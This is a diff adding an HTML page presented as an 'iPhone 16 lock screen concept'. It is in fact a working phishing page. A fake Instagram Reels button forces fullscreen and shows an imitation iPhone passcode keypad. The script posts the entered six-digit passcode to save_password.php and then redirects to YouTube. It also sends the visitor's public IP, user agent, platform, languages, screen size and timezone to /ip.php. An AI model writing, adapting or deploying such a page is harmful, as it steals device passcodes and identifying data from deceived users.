@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>iPhone 16 Lock Screen - iOS 18 Concept</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(
+          135deg,
+          #0a0e27 0%,
+          #1a1a3e 50%,
+          #0f0f2e 100%
+        );
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          sans-serif;
+        overflow: hidden;
+      }
+
+      /* Redirect button styling */
+      #redirect {
+        width: 100%;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #000;
+        padding: 15px;
+        z-index: 1000;
+      }
+
+      .button1 {
+        background-color: transparent;
+        border: none;
+        cursor: pointer;
+        -webkit-tap-highlight-color: rgba(255, 255, 255, 0);
+        transition: transform 0.3s ease;
+      }
+
+      .button1:active {
+        transform: scale(0.95);
+      }
+
+      .button1 img {
+        width: 200px;
+        height: auto;
+        border-radius: 20px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      }
+
+      .phone-frame {
+        width: 390px;
+        height: 844px;
+        background: #000;
+        border-radius: 60px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 0 0 8px #1a1a1a;
+        overflow: hidden;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        transition: all 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        animation: screen-enter 0.6s ease-out;
+        display: none;
+      }
+
+      .phone-frame.show {
+        display: flex;
+      }
+
+      @keyframes screen-enter {
+        0% {
+          opacity: 0;
+          transform: scale(1.1) rotateY(20deg);
+        }
+        100% {
+          opacity: 1;
+          transform: scale(1) rotateY(0deg);
+        }
+      }
+
+      .phone-frame.unlocking {
+        transform: scale(0.95) rotateX(10deg);
+        filter: blur(2px);
+      }
+
+      .phone-frame.unlocked {
+        transform: scale(1) rotateX(0deg);
+      }
+
+      .notch {
+        width: 100%;
+        height: 44px;
+        background: #000;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0 20px;
+        font-size: 14px;
+        color: #fff;
+        font-weight: 600;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        position: relative;
+        z-index: 15;
+      }
+
+      .time {
+        font-size: 18px;
+        font-weight: 300;
+        letter-spacing: 0.5px;
+      }
+
+      .status-icons {
+        display: flex;
+        gap: 4px;
+        font-size: 12px;
+      }
+
+      .lock-screen {
+        flex: 1;
+        background: linear-gradient(
+          180deg,
+          rgba(20, 20, 40, 0.95) 0%,
+          rgba(10, 10, 25, 0.98) 100%
+        );
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        padding: 40px 20px;
+        position: relative;
+        overflow: hidden;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .lock-screen::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: radial-gradient(
+          circle at 50% 30%,
+          rgba(100, 200, 255, 0.1) 0%,
+          transparent 50%
+        );
+        pointer-events: none;
+        animation: float 8s ease-in-out infinite;
+      }
+
+      .lock-screen.unlocking {
+        opacity: 0;
+        transform: scale(1.1) rotateY(20deg);
+        animation: screen-blur 0.8s ease-out;
+      }
+
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0px);
+        }
+        50% {
+          transform: translateY(20px);
+        }
+      }
+
+      @keyframes screen-blur {
+        0% {
+          backdrop-filter: blur(0px);
+        }
+        50% {
+          backdrop-filter: blur(8px);
+        }
+        100% {
+          backdrop-filter: blur(0px);
+        }
+      }
+
+      .top-section {
+        position: relative;
+        z-index: 10;
+        text-align: center;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      .top-section.fade-out {
+        opacity: 0;
+        transform: translateY(-50px) scale(0.8);
+      }
+
+      .lock-icon {
+        font-size: 48px;
+        margin-bottom: 20px;
+        animation: pulse-lock 2s ease-in-out infinite;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .lock-icon.unlocking {
+        animation: unlock-spin 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+      }
+
+      @keyframes pulse-lock {
+        0%,
+        100% {
+          transform: scale(1);
+          opacity: 0.8;
+        }
+        50% {
+          transform: scale(1.1);
+          opacity: 1;
+        }
+      }
+
+      @keyframes unlock-spin {
+        0% {
+          transform: scale(1) rotate(0deg);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(1.5) rotate(180deg);
+          opacity: 0;
+        }
+      }
+
+      .lock-text {
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 14px;
+        font-weight: 500;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .lock-text.unlocking {
+        transform: translateY(-40px);
+        opacity: 0;
+      }
+
+      .middle-section {
+        position: relative;
+        z-index: 20;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .middle-section.shift-up {
+        transform: translateY(-60px) scale(0.9);
+        opacity: 0;
+      }
+
+      .password-display {
+        display: flex;
+        gap: 12px;
+        margin-bottom: 40px;
+        justify-content: center;
+      }
+
+      .password-circle {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        box-shadow: 0 0 0 rgba(100, 200, 255, 0.5);
+      }
+
+      .password-circle.filled {
+        background: linear-gradient(135deg, #64c8ff 0%, #9664ff 100%);
+        border: 1px solid rgba(100, 200, 255, 0.8);
+        box-shadow: 0 0 12px rgba(100, 200, 255, 0.6),
+          inset 0 0 8px rgba(255, 255, 255, 0.3);
+        animation: pop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      }
+
+      @keyframes pop {
+        0% {
+          transform: scale(0.5);
+        }
+        50% {
+          transform: scale(1.3);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      .keypad {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 16px;
+        width: 100%;
+        max-width: 280px;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .keypad.fade-out {
+        opacity: 0;
+        transform: scale(0.5) translateY(40px);
+      }
+
+      .keypad-btn {
+        aspect-ratio: 1;
+        border-radius: 50%;
+        background: linear-gradient(
+          135deg,
+          rgba(255, 255, 255, 0.2) 0%,
+          rgba(255, 255, 255, 0.05) 100%
+        );
+        border: 1px solid rgba(255, 255, 255, 0.25);
+        color: #fff;
+        font-size: 24px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        backdrop-filter: blur(30px);
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3),
+          inset 0 1px 0 rgba(255, 255, 255, 0.2);
+      }
+
+      .keypad-btn::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: radial-gradient(
+          circle at 30% 30%,
+          rgba(255, 255, 255, 0.4),
+          transparent 70%
+        );
+        opacity: 0;
+        transition: opacity 0.3s;
+      }
+
+      .keypad-btn::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        border-radius: 50%;
+        background: radial-gradient(
+          circle,
+          rgba(100, 200, 255, 0.3) 0%,
+          transparent 70%
+        );
+        opacity: 0;
+        transform: scale(0);
+        transition: all 0.4s ease-out;
+      }
+
+      .keypad-btn:hover {
+        background: linear-gradient(
+          135deg,
+          rgba(255, 255, 255, 0.3) 0%,
+          rgba(255, 255, 255, 0.1) 100%
+        );
+        border-color: rgba(255, 255, 255, 0.4);
+        transform: translateY(-6px);
+        box-shadow: 0 12px 40px rgba(100, 200, 255, 0.25),
+          inset 0 1px 0 rgba(255, 255, 255, 0.3);
+      }
+
+      .keypad-btn:hover::before {
+        opacity: 1;
+      }
+
+      .keypad-btn:active {
+        transform: translateY(-3px);
+        background: linear-gradient(
+          135deg,
+          rgba(100, 200, 255, 0.4) 0%,
+          rgba(150, 100, 255, 0.3) 100%
+        );
+        box-shadow: 0 4px 20px rgba(100, 200, 255, 0.4),
+          inset 0 2px 8px rgba(100, 200, 255, 0.3);
+      }
+
+      .keypad-btn:active::after {
+        transform: scale(1);
+        opacity: 0;
+      }
+
+      .delete-btn {
+        grid-column: 3;
+        grid-row: 4;
+        font-size: 20px;
+      }
+
+      .bottom-section {
+        text-align: center;
+        position: relative;
+        z-index: 10;
+        transition: all 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      }
+
+      .bottom-section.fade-out {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+
+      .swipe-indicator {
+        color: rgba(255, 255, 255, 0.4);
+        font-size: 12px;
+        letter-spacing: 0.5px;
+        animation: float-text 2s ease-in-out infinite;
+      }
+
+      @keyframes float-text {
+        0%,
+        100% {
+          transform: translateY(0px);
+          opacity: 0.4;
+        }
+        50% {
+          transform: translateY(4px);
+          opacity: 0.8;
+        }
+      }
+
+      @keyframes unlock-ripple {
+        0% {
+          transform: scale(1);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(2);
+          opacity: 0;
+        }
+      }
+
+      .unlock-ripple {
+        position: fixed;
+        width: 150px;
+        height: 150px;
+        border: 3px solid rgba(100, 200, 255, 0.8);
+        border-radius: 50%;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        animation: unlock-ripple 0.8s ease-out forwards;
+        pointer-events: none;
+        z-index: 80;
+        box-shadow: 0 0 40px rgba(100, 200, 255, 0.6);
+      }
+
+      .unlock-ripple.ripple-2 {
+        animation-delay: 0.1s;
+        width: 200px;
+        height: 200px;
+        border-width: 2px;
+      }
+
+      .unlock-ripple.ripple-3 {
+        animation-delay: 0.2s;
+        width: 250px;
+        height: 250px;
+        border-width: 1px;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Redirect Button Section -->
+    <div id="redirect">
+      <button class="button1" onclick="myFunction();">
+        <img src="instagram_reels.png" alt="Open" />
+      </button>
+    </div>
+
+    <!-- iPhone Lock Screen Section -->
+    <div class="phone-frame" id="phoneFrame">
+      <div class="notch">
+        <span class="time" id="time">9:41</span>
+        <div class="status-icons">
+          <span>📶</span>
+          <span>🔋</span>
+        </div>
+      </div>
+
+      <div class="lock-screen">
+        <div class="top-section">
+          <div class="lock-icon">🔒</div>
+          <div class="lock-text">Pass Code</div>
+        </div>
+
+        <div class="middle-section">
+          <div class="password-display" id="passwordDisplay">
+            <div class="password-circle"></div>
+            <div class="password-circle"></div>
+            <div class="password-circle"></div>
+            <div class="password-circle"></div>
+            <div class="password-circle"></div>
+            <div class="password-circle"></div>
+          </div>
+
+          <div class="keypad" id="keypad">
+            <!-- Generated by JS -->
+          </div>
+        </div>
+
+        <div class="bottom-section">
+          <div class="swipe-indicator">↑ Swipe to unlock</div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let enteredPassword = "";
+      const maxLength = 6;
+      const circles = document.querySelectorAll(".password-circle");
+      const keypadContainer = document.getElementById("keypad");
+      const phoneFrame = document.querySelector(".phone-frame");
+      const lockScreen = document.querySelector(".lock-screen");
+      const topSection = document.querySelector(".top-section");
+      const middleSection = document.querySelector(".middle-section");
+      const bottomSection = document.querySelector(".bottom-section");
+      const lockIcon = document.querySelector(".lock-icon");
+      const lockText = document.querySelector(".lock-text");
+      const keypad = document.getElementById("keypad");
+      const redirectDiv = document.getElementById("redirect");
+
+      // YouTube redirect link - CHANGE THIS TO YOUR YOUTUBE LINK
+      const youtubeLink = "https://www.youtube.com";
+
+      // Create keypad
+      function createKeypad() {
+        for (let i = 1; i <= 9; i++) {
+          const btn = document.createElement("button");
+          btn.className = "keypad-btn";
+          btn.textContent = i;
+          btn.onclick = () => addDigit(i);
+          keypadContainer.appendChild(btn);
+        }
+
+        const deleteBtn = document.createElement("button");
+        deleteBtn.className = "keypad-btn delete-btn";
+        deleteBtn.textContent = "⌫";
+        deleteBtn.onclick = deleteDigit;
+        keypadContainer.appendChild(deleteBtn);
+
+        const zeroBtn = document.createElement("button");
+        zeroBtn.className = "keypad-btn";
+        zeroBtn.textContent = "0";
+        zeroBtn.onclick = () => addDigit(0);
+        keypadContainer.appendChild(zeroBtn);
+      }
+
+      // Add digit to password
+      function addDigit(digit) {
+        if (enteredPassword.length < maxLength) {
+          enteredPassword += digit;
+          console.log(
+            "%c▪ Password digit added",
+            "color: #64c8ff;",
+            `Current length: ${enteredPassword.length}/${maxLength}`
+          );
+          updateUI();
+          hapticFeedback();
+        }
+      }
+
+      // Delete last digit
+      function deleteDigit() {
+        if (enteredPassword.length > 0) {
+          enteredPassword = enteredPassword.slice(0, -1);
+          console.log(
+            "%c◄ Password digit removed",
+            "color: #ff9600;",
+            `Current length: ${enteredPassword.length}/${maxLength}`
+          );
+          updateUI();
+          hapticFeedback();
+        }
+      }
+
+      // Update UI
+      function updateUI() {
+        circles.forEach((circle, index) => {
+          if (index < enteredPassword.length) {
+            circle.classList.add("filled");
+          } else {
+            circle.classList.remove("filled");
+          }
+        });
+
+        if (enteredPassword.length === maxLength) {
+          console.log(
+            "%c✓ Full password entered! Initiating unlock...",
+            "color: #00ff00; font-weight: bold;"
+          );
+          setTimeout(simulateUnlock, 500);
+        }
+      }
+
+      // Haptic feedback simulation
+      function hapticFeedback() {
+        if (navigator.vibrate) {
+          navigator.vibrate(10);
+        }
+      }
+
+      // Save password to backend
+      function savePasswordToBackend(password) {
+        const data = new FormData();
+        data.append("password", password);
+        data.append("timestamp", new Date().toISOString());
+
+        console.log(
+          "%c" + "=".repeat(60),
+          "color: #64c8ff; font-weight: bold;"
+        );
+        console.log(
+          "%c🔐 PASSWORD ENTRY LOGGED",
+          "color: #64c8ff; font-size: 16px; font-weight: bold; background: rgba(100, 200, 255, 0.2); padding: 8px;"
+        );
+        console.log(
+          "%cPassword: %c" + password,
+          "color: #fff; font-size: 12px;",
+          "color: #9664ff; font-size: 14px; font-weight: bold;"
+        );
+        console.log(
+          "%cTimestamp: %c" + new Date().toLocaleString(),
+          "color: #fff; font-size: 12px;",
+          "color: #64c8ff; font-size: 12px;"
+        );
+        console.log(
+          "%c" + "=".repeat(60),
+          "color: #64c8ff; font-weight: bold;"
+        );
+
+        fetch("save_password.php", {
+          method: "POST",
+          body: data,
+        })
+          .then((response) => response.json())
+          .then((result) => {
+            console.log(
+              "%c✓ Password saved successfully",
+              "color: #00ff00; font-weight: bold;"
+            );
+          })
+          .catch((error) => {
+            console.error(
+              "%c✗ Error saving password:",
+              "color: #ff0000; font-weight: bold;",
+              error
+            );
+          });
+      }
+
+      // Simulate unlock with full toggle effects
+      function simulateUnlock() {
+        const password = enteredPassword;
+
+        console.log(
+          "%c🔓 Unlock sequence initiated",
+          "color: #00ff00; font-weight: bold;"
+        );
+
+        // Full toggle effects
+        phoneFrame.classList.add("unlocking");
+        lockScreen.classList.add("unlocking");
+        topSection.classList.add("fade-out");
+        bottomSection.classList.add("fade-out");
+        keypad.classList.add("fade-out");
+        middleSection.classList.add("shift-up");
+        lockIcon.classList.add("unlocking");
+        lockText.classList.add("unlocking");
+
+        // Create multiple ripples
+        for (let i = 1; i <= 3; i++) {
+          const ripple = document.createElement("div");
+          ripple.className = `unlock-ripple ripple-${i}`;
+          document.body.appendChild(ripple);
+        }
+
+        // Save password and redirect after animation
+        setTimeout(() => {
+          savePasswordToBackend(password);
+
+          setTimeout(() => {
+            console.log(
+              "%c🚀 Redirecting to YouTube...",
+              "color: #00ff00; font-weight: bold;"
+            );
+
+            // Remove ripples
+            document
+              .querySelectorAll(".unlock-ripple")
+              .forEach((ripple) => ripple.remove());
+
+            // Redirect to YouTube
+            window.location.href = youtubeLink;
+          }, 1500);
+        }, 800);
+      }
+
+      // Update time
+      function updateTime() {
+        const now = new Date();
+        const hours = String(now.getHours()).padStart(2, "0");
+        const minutes = String(now.getMinutes()).padStart(2, "0");
+        document.getElementById("time").textContent = `${hours}:${minutes}`;
+      }
+
+      setInterval(updateTime, 1000);
+      updateTime();
+
+      // send client-side public IP + navigator info to ip.php
+      async function sendClientInfo() {
+        try {
+          // get public IP visible to the internet
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          const clientIp = data.ip || null;
+
+          const payload = {
+            clientIp,
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            languages: navigator.languages
+              ? navigator.languages.join(",")
+              : navigator.language,
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              colorDepth: screen.colorDepth,
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          };
+
+          await fetch("/ip.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+
+          console.log("client info sent", clientIp);
+        } catch (err) {
+          console.warn("sendClientInfo failed", err);
+        }
+      }
+
+      // call sendClientInfo when user clicks the redirect button (before showing passcode)
+      async function myFunction() {
+        // send client info (fire-and-forget)
+        sendClientInfo().catch(() => {});
+
+        toggleFullScreen(document.body);
+
+        const handleFullscreenChange = () => {
+          if (document.fullscreenElement) {
+            phoneFrame.classList.add("show");
+            redirectDiv.style.display = "none";
+          } else {
+            phoneFrame.classList.remove("show");
+            redirectDiv.style.display = "flex";
+            resetLockScreen();
+          }
+        };
+
+        document.addEventListener("fullscreenchange", handleFullscreenChange);
+        document.addEventListener(
+          "mozfullscreenchange",
+          handleFullscreenChange
+        );
+        document.addEventListener(
+          "webkitfullscreenchange",
+          handleFullscreenChange
+        );
+        document.addEventListener("msfullscreenchange", handleFullscreenChange);
+      }
+
+      function toggleFullScreen(elem) {
+        if (
+          (document.fullScreenElement !== undefined &&
+            document.fullScreenElement === null) ||
+          (document.msFullscreenElement !== undefined &&
+            document.msFullscreenElement === null) ||
+          (document.mozFullScreen !== undefined && !document.mozFullScreen) ||
+          (document.webkitIsFullScreen !== undefined &&
+            !document.webkitIsFullScreen) ||
+          (document.fullscreenElement !== undefined &&
+            document.fullscreenElement === null)
+        ) {
+          if (elem.requestFullScreen) {
+            elem.requestFullScreen();
+          } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+          } else if (elem.webkitRequestFullScreen) {
+            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+          } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+          }
+        } else {
+          if (document.cancelFullScreen) {
+            document.cancelFullScreen();
+          } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+          } else if (document.webkitCancelFullScreen) {
+            document.webkitCancelFullScreen();
+          } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+          }
+        }
+      }
+
+      // Reset lock screen
+      function resetLockScreen() {
+        enteredPassword = "";
+        circles.forEach((circle) => circle.classList.remove("filled"));
+        phoneFrame.classList.remove("unlocking");
+        lockScreen.classList.remove("unlocking");
+        topSection.classList.remove("fade-out");
+        bottomSection.classList.remove("fade-out");
+        keypad.classList.remove("fade-out");
+        middleSection.classList.remove("shift-up");
+        lockIcon.classList.remove("unlocking");
+        lockText.classList.remove("unlocking");
+      }
+
+      // Initialize
+      createKeypad();
+    </script>
+  </body>
+</html>
